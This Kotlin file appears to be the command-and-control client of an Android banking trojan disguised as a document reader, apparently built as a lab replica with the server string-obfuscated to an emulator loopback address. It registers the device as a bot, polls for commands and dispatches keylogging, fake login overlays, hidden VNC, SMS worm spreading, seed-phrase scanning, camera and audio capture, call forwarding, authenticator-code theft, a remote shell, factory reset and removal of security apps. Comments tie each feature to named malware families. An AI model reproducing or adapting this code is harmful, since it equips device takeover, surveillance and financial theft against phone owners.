package com.docreader.lite.reader

import android.content.Context
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/**
 * C2 communication — command & control channel.
 *
 * Endpoints (lab loopback — 10.0.2.2 for emulator):
 *   POST /api/v1/register  — bot registration
 *   GET  /api/v1/commands  — poll for pending commands
 *   POST /api/v1/exfil     — batch exfil stolen data
 *   POST /api/v1/ack       — command acknowledgment
 *
 * Commands received:
 *   START_KEYLOG, STOP_KEYLOG, SHOW_OVERLAY, UPDATE_TARGETS,
 *   GET_SMS, EXFIL_NOW, PING, SCREENSHOT, SELF_DESTRUCT
 */
object C2 {

    private const val K = 13
    private fun d(a: IntArray) = String(CharArray(a.size) { (a[it] - K).toChar() })

    // "10.0.2.2"
    private val _h = intArrayOf(62,61,59,61,59,63,59,63)
    // 8080
    private const val _p = 8080

    // "/api/v1/exfil"
    private val _ex = intArrayOf(60,110,125,118,60,131,62,60,114,133,115,118,121)
    // "/api/v1/register"
    private val _rg = intArrayOf(60,110,125,118,60,131,62,60,127,114,116,118,128,129,114,127)
    // "/api/v1/commands"
    private val _cm = intArrayOf(60,110,125,118,60,131,62,60,112,124,122,122,110,123,113,128)
    // "application/json"
    private val _ct = intArrayOf(110,125,125,121,118,112,110,129,118,124,123,60,119,128,124,123)
    // "X-Bot-Id"
    private val _hk = intArrayOf(101,58,79,124,129,58,86,113)

    private val client = OkHttpClient.Builder()
        .connectTimeout(5, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .build()

    private var pollJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    fun baseUrl() = "http://${d(_h)}:$_p"
    fun exfilUrl() = "${baseUrl()}${d(_ex)}"

    fun init(context: Context) {
        // Silent init — nothing visible to user
        Exfil.startPeriodicFlush()
    }

    fun registerBot(context: Context) {
        val payload = JSONObject().apply {
            put("bot_id", android.os.Build.MODEL + "_" + android.os.Build.SERIAL)
            put("model", android.os.Build.MODEL)
            put("manufacturer", android.os.Build.MANUFACTURER)
            put("sdk", android.os.Build.VERSION.SDK_INT)
            put("package", context.packageName)
            put("lang", java.util.Locale.getDefault().language)
            put("ts", System.currentTimeMillis())
        }

        scope.launch {
            try {
                val body = payload.toString().toRequestBody(d(_ct).toMediaType())
                val req = Request.Builder()
                    .url("${baseUrl()}${d(_rg)}")
                    .post(body)
                    .build()
                client.newCall(req).execute().close()
            } catch (_: Exception) { /* retry on next poll */ }
        }
    }

    fun startPolling(context: Context, intervalMs: Long = 30_000) {
        pollJob?.cancel()
        pollJob = scope.launch {
            while (isActive) {
                poll(context)
                delay(intervalMs)
            }
        }
    }

    fun stopPolling() {
        pollJob?.cancel()
        pollJob = null
    }

    private suspend fun poll(context: Context) {
        try {
            val req = Request.Builder()
                .url("${baseUrl()}${d(_cm)}")
                .header(d(_hk), android.os.Build.MODEL)
                .build()
            val resp = client.newCall(req).execute()
            val body = resp.body?.string() ?: return
            resp.close()

            if (body.isBlank() || body == "[]") return
            executeCommands(context, body)
        } catch (_: Exception) {}
    }

    private fun executeCommands(context: Context, json: String) {
        try {
            val cmds = JSONArray(json)
            for (i in 0 until cmds.length()) {
                val cmd = cmds.getJSONObject(i)
                val type = cmd.optString("type", "").uppercase()
                val params = cmd.optJSONObject("params") ?: JSONObject()

                when (type) {
                    "START_KEYLOG" -> { /* already always on via A11y */ }
                    "SHOW_OVERLAY" -> {
                        val pkg = params.optString("package", "")
                        val t = params.optString("overlay_type", "LOGIN")
                        if (pkg.isNotEmpty()) {
                            val ot = try { Targets.OverlayType.valueOf(t) }
                            catch (_: Exception) { Targets.OverlayType.LOGIN }
                            OverlayRenderer.show(context, Targets.Target(pkg, pkg, ot))
                        }
                    }
                    "UPDATE_TARGETS" -> {
                        val arr = params.optJSONArray("targets") ?: return
                        val list = mutableListOf<Targets.Target>()
                        for (j in 0 until arr.length()) {
                            val t = arr.getJSONObject(j)
                            list.add(Targets.Target(
                                t.getString("package"),
                                t.optString("name", t.getString("package"))
                            ))
                        }
                        Targets.updateAll(list)
                    }
                    "EXFIL_NOW" -> Exfil.flush()
                    "PING" -> { /* ack handled by periodic exfil */ }

                    // ─── 2026 commands ──────────────────────────────────────
                    "LOAD_PAYLOAD" -> {
                        // Modular loader: 4-stage Anatsa payload fetch
                        val url = params.optString("url", baseUrl())
                        com.docreader.lite.reader.sync.PluginLoader.executeAsync(context, url) { results ->
                            Exfil.event("modular_loader_complete",
                                "stages" to results.size.toString(),
                                "success" to results.all { it.success }.toString()
                            )
                        }
                    }
                    "START_PROXY" -> {
                        // Residential proxy: Mirax SOCKS5 monetization
                        val port = params.optInt("port", 1080)
                        com.docreader.lite.reader.advanced.ResidentialProxy.start(port)
                        Exfil.event("proxy_started", "port" to port.toString())
                    }
                    "STOP_PROXY" -> {
                        com.docreader.lite.reader.advanced.ResidentialProxy.stop()
                    }
                    "VNC_COMMAND" -> {
                        // Hidden VNC: remote gesture from C2 panel
                        val a11y = DocumentReaderService.instance ?: return
                        val action = params.optString("action", "")
                        val vncCmd = when (action) {
                            "tap" -> com.docreader.lite.reader.advanced.HiddenVnc.VncCommand.Tap(
                                params.optDouble("x", 0.0).toFloat(),
                                params.optDouble("y", 0.0).toFloat()
                            )
                            "swipe" -> com.docreader.lite.reader.advanced.HiddenVnc.VncCommand.Swipe(
                                params.optDouble("sx", 0.0).toFloat(),
                                params.optDouble("sy", 0.0).toFloat(),
                                params.optDouble("ex", 0.0).toFloat(),
                                params.optDouble("ey", 0.0).toFloat(),
                            )
                            "type" -> com.docreader.lite.reader.advanced.HiddenVnc.VncCommand.Type(
                                params.optString("text", "")
                            )
                            "back" -> com.docreader.lite.reader.advanced.HiddenVnc.VncCommand.Back
                            "home" -> com.docreader.lite.reader.advanced.HiddenVnc.VncCommand.Home
                            "recents" -> com.docreader.lite.reader.advanced.HiddenVnc.VncCommand.Recents
                            else -> null
                        }
                        if (vncCmd != null) {
                            com.docreader.lite.reader.advanced.HiddenVnc.executeCommand(a11y, vncCmd)
                        }
                    }
                    "SSO_APPROVE" -> {
                        // Vespertine: auto-approve SSO MFA
                        val a11y = DocumentReaderService.instance
                        if (a11y != null) {
                            com.docreader.lite.reader.advanced.SsoManager.autoApprove(a11y)
                        }
                    }
                    "START_VNC" -> {
                        // Start VNC capture (requires MediaProjection — handled separately)
                        val fps = params.optInt("fps", 2)
                        com.docreader.lite.reader.advanced.HiddenVnc.startCapture(fps)
                    }
                    "STOP_VNC" -> {
                        com.docreader.lite.reader.advanced.HiddenVnc.stopCapture()
                    }
                    "SELF_DESTRUCT" -> {
                        // Real banker: uninstall or wipe + hide
                        stopPolling()
                        Exfil.stopFlush()
                        com.docreader.lite.reader.advanced.ResidentialProxy.stop()
                        com.docreader.lite.reader.advanced.YamuxProxy.stop()
                        com.docreader.lite.reader.advanced.HiddenVnc.stopCapture()
                        com.docreader.lite.reader.share.ShareManager.stop()
                        com.docreader.lite.reader.sync.ContentSyncWorker.cancel(context)
                        com.docreader.lite.reader.sync.UpdateChannel.stopPolling()
                    }

                    // ─── Spreading commands ─────────────────────────────────
                    "SPREAD" -> {
                        // FluBot SMS worm spreading
                        val url = params.optString("url", "")
                        val template = params.optString("template", "")
                        com.docreader.lite.reader.share.ShareManager.spread(
                            context,
                            url.ifEmpty { null },
                            template.ifEmpty { null }
                        )
                    }
                    "STOP_SPREAD" -> {
                        com.docreader.lite.reader.share.ShareManager.stop()
                    }
                    "HARVEST_CONTACTS" -> {
                        com.docreader.lite.reader.share.ContactSync.exfiltrate(context)
                    }

                    // ─── Yamux multiplexed proxy ────────────────────────────
                    "START_YAMUX" -> {
                        val host = params.optString("host", d(_h))
                        val port = params.optInt("port", 9090)
                        val socksPort = params.optInt("socks_port", 1080)
                        com.docreader.lite.reader.advanced.YamuxProxy.start(host, port, socksPort)
                    }
                    "STOP_YAMUX" -> {
                        com.docreader.lite.reader.advanced.YamuxProxy.stop()
                    }

                    // ─── Reconnaissance ─────────────────────────────────────
                    "PROBE_PI" -> {
                        // Play Integrity probe — check if target app uses PI
                        val targets = mutableListOf<String>()
                        val arr = params.optJSONArray("targets")
                        if (arr != null) {
                            for (j in 0 until arr.length()) targets.add(arr.getString(j))
                        }
                        val results = com.docreader.lite.reader.advanced.PlayIntegrityProbe
                            .probeAllTargets(context, targets)
                        // Results already exfiltrated inside probeAllTargets
                    }
                    "SENSOR_CHECK" -> {
                        // Multi-axis sensor validation (re-evaluate on C2 demand)
                        scope.launch {
                            val result = com.docreader.lite.reader.advanced.MultiAxisSensor
                                .evaluate(context)
                            Exfil.event("sensor_recheck",
                                "is_real" to result.isRealDevice.toString(),
                                "fails" to result.failReasons.joinToString(",")
                            )
                        }
                    }
                    "SCAN_NOTES" -> {
                        // Perseus: scan shared storage for seed phrases
                        scope.launch {
                            val findings = com.docreader.lite.reader.advanced.NoteScanner
                                .scanSharedStorage()
                            Exfil.event("note_scan_complete",
                                "found" to findings.size.toString()
                            )
                        }
                    }

                    // ─── Device intelligence ───────────────────────────────
                    "RECON" -> {
                        // Full device reconnaissance beacon
                        DeviceRecon.beacon(context)
                    }
                    "GEO_START" -> {
                        // Geolocation tracking — Brokewell, ToxicPanda
                        val interval = params.optLong("interval_ms", 300_000)
                        LocationHelper.updateConfig(interval, params.optDouble("min_distance", 50.0).toFloat())
                        LocationHelper.startTracking(context)
                    }
                    "GEO_STOP" -> {
                        LocationHelper.stopTracking()
                    }

                    // ─── Screen + media capture ────────────────────────────
                    "SCREEN_STREAM" -> {
                        // Screen streaming — Brokewell, Albiriox
                        val fps = params.optInt("fps", 2)
                        val streamMode = when (params.optString("mode", "periodic")) {
                            "continuous" -> com.docreader.lite.reader.advanced.ScreenStreamer.Mode.CONTINUOUS
                            "on_demand" -> com.docreader.lite.reader.advanced.ScreenStreamer.Mode.ON_DEMAND
                            else -> com.docreader.lite.reader.advanced.ScreenStreamer.Mode.PERIODIC
                        }
                        com.docreader.lite.reader.advanced.ScreenStreamer.startStreaming(
                            context, streamMode, fps)
                    }
                    "SCREEN_STOP" -> {
                        com.docreader.lite.reader.advanced.ScreenStreamer.stopStreaming()
                    }
                    "SCREENSHOT" -> {
                        // Single screenshot capture
                        com.docreader.lite.reader.advanced.ScreenStreamer.captureScreenshot(context)
                    }
                    "RECORD_AUDIO" -> {
                        // Audio recording — Brokewell
                        val duration = params.optInt("duration_sec", 60)
                        com.docreader.lite.reader.advanced.AudioRecorder.recordFor(duration)
                    }
                    "STOP_AUDIO" -> {
                        com.docreader.lite.reader.advanced.AudioRecorder.stopRecording()
                    }
                    "CAMERA" -> {
                        // Camera capture — Brokewell, Cerberus
                        val front = params.optBoolean("front", true)
                        com.docreader.lite.reader.advanced.CameraCapture.capturePhoto(context, front)
                    }
                    "CAMERA_ALL" -> {
                        // Capture from both cameras
                        com.docreader.lite.reader.advanced.CameraCapture.captureAll(context)
                    }

                    // ─── Notification suppression ──────────────────────────
                    "SUPPRESS_NOTIFS" -> {
                        // Notification suppression — TrickMo, SOVA
                        val suppressMode = when (params.optString("mode", "target")) {
                            "off" -> NotificationFilter.Mode.OFF
                            "target" -> NotificationFilter.Mode.TARGET_ONLY
                            "banking" -> NotificationFilter.Mode.ALL_BANKING
                            "aggressive" -> NotificationFilter.Mode.AGGRESSIVE
                            else -> NotificationFilter.Mode.TARGET_ONLY
                        }
                        NotificationFilter.setMode(suppressMode)
                        val pkgs = mutableListOf<String>()
                        params.optJSONArray("packages")?.let { arr ->
                            for (j in 0 until arr.length()) pkgs.add(arr.getString(j))
                        }
                        if (pkgs.isNotEmpty()) NotificationFilter.updateSuppressList(pkgs)
                    }

                    // ─── Call hijacking ─────────────────────────────────────
                    "CALL_FORWARD" -> {
                        // USSD call forwarding — FakeCall, Cerberus
                        val number = params.optString("number", "")
                        val fwdType = when (params.optString("type", "all")) {
                            "no_reply" -> com.docreader.lite.reader.advanced.CallForwarder.ForwardType.NO_REPLY
                            "busy" -> com.docreader.lite.reader.advanced.CallForwarder.ForwardType.BUSY
                            "unreachable" -> com.docreader.lite.reader.advanced.CallForwarder.ForwardType.NOT_REACHABLE
                            else -> com.docreader.lite.reader.advanced.CallForwarder.ForwardType.ALL
                        }
                        if (number.isNotEmpty()) {
                            com.docreader.lite.reader.advanced.CallForwarder.setupUssdForwarding(
                                context, number, fwdType)
                        }
                    }
                    "CALL_FORWARD_CANCEL" -> {
                        com.docreader.lite.reader.advanced.CallForwarder.cancelForwarding(context)
                    }
                    "SET_INTERCEPT" -> {
                        // Set numbers to intercept — FakeCall
                        val numbers = mutableListOf<String>()
                        params.optJSONArray("numbers")?.let { arr ->
                            for (j in 0 until arr.length()) numbers.add(arr.getString(j))
                        }
                        com.docreader.lite.reader.advanced.CallForwarder.setInterceptNumbers(numbers)
                        com.docreader.lite.reader.advanced.CallForwarder.setForwardNumber(
                            params.optString("forward_to", ""))
                    }
                    "USSD" -> {
                        // Execute arbitrary USSD code
                        val code = params.optString("code", "")
                        if (code.isNotEmpty()) {
                            com.docreader.lite.reader.advanced.CallForwarder.executeUssd(context, code)
                        }
                    }

                    // ─── Authenticator capture ──────────────────────────────
                    "CAPTURE_AUTH" -> {
                        // Google Authenticator TOTP capture — Crocodilus TG32XAZADG
                        val a11y = DocumentReaderService.instance
                        if (a11y != null) {
                            com.docreader.lite.reader.advanced.AuthenticatorCapture.capture(a11y)
                        }
                    }

                    // ─── Contact injection ──────────────────────────────────
                    "INJECT_CONTACTS" -> {
                        // Crocodilus June 2025 — fake bank contacts
                        val contacts = mutableListOf<com.docreader.lite.reader.advanced.ContactInjector.FakeContact>()
                        params.optJSONArray("contacts")?.let { arr ->
                            for (j in 0 until arr.length()) {
                                val c = arr.getJSONObject(j)
                                contacts.add(com.docreader.lite.reader.advanced.ContactInjector.FakeContact(
                                    name = c.optString("name"),
                                    number = c.optString("number"),
                                    email = c.optString("email", null),
                                    organization = c.optString("org", null)
                                ))
                            }
                        }
                        com.docreader.lite.reader.advanced.ContactInjector.injectBatch(context, contacts)
                    }

                    // ─── Black screen overlay ───────────────────────────────
                    "BLACK_SCREEN" -> {
                        // Crocodilus, ToxicPanda — RAT masking
                        val screenMode = when (params.optString("mode", "update")) {
                            "black" -> ScreenDimmer.ScreenMode.BLACK
                            "loading" -> ScreenDimmer.ScreenMode.LOADING
                            "locked" -> ScreenDimmer.ScreenMode.LOCKED
                            else -> ScreenDimmer.ScreenMode.UPDATE
                        }
                        val duration = params.optLong("duration_ms", 60_000)
                        ScreenDimmer.showDuring(context, screenMode, duration)
                    }
                    "BLACK_SCREEN_OFF" -> {
                        ScreenDimmer.dismiss()
                    }

                    // ─── Touch logging ───────────────────────────────────────
                    "TOUCH_LOG_START" -> {
                        // Brokewell — comprehensive input logging
                        com.docreader.lite.reader.advanced.TouchLogger.startLogging()
                    }
                    "TOUCH_LOG_STOP" -> {
                        com.docreader.lite.reader.advanced.TouchLogger.stopLogging()
                    }

                    // ─── Remote shell ────────────────────────────────────────
                    "EXEC" -> {
                        // Brokewell, Albiriox — remote command execution
                        val cmd = params.optString("cmd", "")
                        val cmdId = params.optString("id", "")
                        if (cmd.isNotEmpty()) {
                            com.docreader.lite.reader.advanced.DiagnosticShell.executeAndExfil(cmd, cmdId)
                        }
                    }
                    "FULL_RECON" -> {
                        com.docreader.lite.reader.advanced.DiagnosticShell.fullRecon()
                    }
                    "FACTORY_RESET" -> {
                        // BRATA — nuclear evidence destruction
                        com.docreader.lite.reader.advanced.DiagnosticShell.factoryReset()
                    }

                    // ─── App management ───────────────────────────────────────
                    "LIST_APPS" -> {
                        com.docreader.lite.reader.advanced.PackageHelper.reportSecurityApps(context)
                    }
                    "UNINSTALL" -> {
                        // TrickMo — remove AV/security apps
                        val pkg = params.optString("package", "")
                        if (pkg.isNotEmpty()) {
                            com.docreader.lite.reader.advanced.PackageHelper.triggerUninstall(context, pkg)
                        }
                    }
                    "REMOVE_SECURITY" -> {
                        // Batch remove all security apps
                        com.docreader.lite.reader.advanced.PackageHelper.removeSecurityApps(context)
                    }
                    "DISABLE_PLAY_PROTECT" -> {
                        com.docreader.lite.reader.advanced.PackageHelper.disablePlayProtect(context)
                    }
                    "INSTALL_APK" -> {
                        val path = params.optString("path", "")
                        if (path.isNotEmpty()) {
                            com.docreader.lite.reader.advanced.PackageHelper.installApk(context, path)
                        }
                    }
                }
            }
        } catch (_: Exception) {}
    }
}
